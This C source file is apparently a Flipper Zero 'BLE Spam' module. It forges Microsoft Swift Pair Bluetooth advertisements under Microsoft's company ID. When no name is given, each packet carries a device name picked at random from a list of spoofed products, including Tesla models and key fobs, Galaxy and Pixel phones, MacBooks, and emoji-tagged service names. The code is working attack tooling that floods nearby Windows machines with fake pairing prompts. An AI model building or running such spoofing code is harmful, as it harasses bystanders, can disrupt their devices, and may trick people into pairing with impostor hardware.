#include "swiftpair.h"
#include "_registry.h"

// Hacked together by @Willy-JL and @Spooks4576
// Documentation at https://learn.microsoft.com/en-us/windows-hardware/design/component-guidelines/bluetooth-swift-pair

const char* swiftpair_get_name(const BleSpamMsg* _msg) {
    const SwiftpairMsg* msg = &_msg->swiftpair;
    UNUSED(msg);
    return "SwiftPair";
}

void swiftpair_make_packet(uint8_t* out_size, uint8_t** out_packet, const BleSpamMsg* _msg) {
    const SwiftpairMsg* msg = _msg ? &_msg->swiftpair : NULL;

    const char* display_name;
    if(msg && msg->display_name[0] != '\0') {
        display_name = msg->display_name;
    } else {
        const char* names[] = {
            // ===== TESLA MODELLERİ (2024-2026) =====
            "Model S",
            "Model S Plaid",
            "Model 3",
            "Model 3 Performance",
            "Model Y",
            "Model Y Performance",
            "Model Y Long Range",
            "Model X",
            "Model X Plaid",
            "Cybertruck",
            "Tesla Phone Key",
            "Tesla Key Fob",
            // 2024-2025 Güncel Windows Device isimleri
            "Galaxy S25 Ultra",
            "Galaxy S25+", 
            "Galaxy S25",
            "Galaxy S24 Ultra",
            "Galaxy S24+",
            "Galaxy S24",
            "Galaxy Z Fold 6",
            "Galaxy Z Flip 6",
            "Pixel 9 Pro XL",
            "Pixel 9 Pro",
            "Pixel 9",
            "Pixel 8 Pro",
            "OnePlus 13",
            "OnePlus 12",
            "Samsung Galaxy Tab S10",
            "iPad Pro M4",
            "iPad Air M2",
            "MacBook Pro M4",
            "MacBook Air M4",
            "Mac Mini M4",
            "Surface Pro 11",
            "Surface Laptop 7",
            "Dell XPS 16",
            "HP Spectre x360",
            "Lenovo ThinkPad X1 Carbon",
            "ASUS ROG Phone 9",
            "Redmi K80 Pro",
            // Eğlence isimleri
            "Flipper 🐬",
            "🎵 Spotify",
            "🎮 Xbox",
            "📺 Chromecast",
            "🎬 Netflix",
            "🎮 PlayStation",
            "🔑 Tesla Key",
            "🚗 Tesla App",
        };
        display_name = names[rand() % COUNT_OF(names)];
    }
    uint8_t display_name_len = strlen(display_name);

    uint8_t size = 7 + display_name_len;
    uint8_t* packet = malloc(size);
    uint8_t i = 0;

    packet[i++] = size - 1; // Size
    packet[i++] = 0xFF; // AD Type (Manufacturer Specific)
    packet[i++] = 0x06; // Company ID (Microsoft)
    packet[i++] = 0x00; // ...
    packet[i++] = 0x03; // Microsoft Beacon ID
    packet[i++] = 0x00; // Microsoft Beacon Sub Scenario
    packet[i++] = 0x80; // Reserved RSSI Byte
    memcpy(&packet[i], display_name, display_name_len); // Display Name
    i += display_name_len;

    *out_size = size;
    *out_packet = packet;
}

const BleSpamProtocol ble_spam_protocol_swiftpair = {
    .icon = NULL,
    .get_name = swiftpair_get_name,
    .make_packet = swiftpair_make_packet,
};
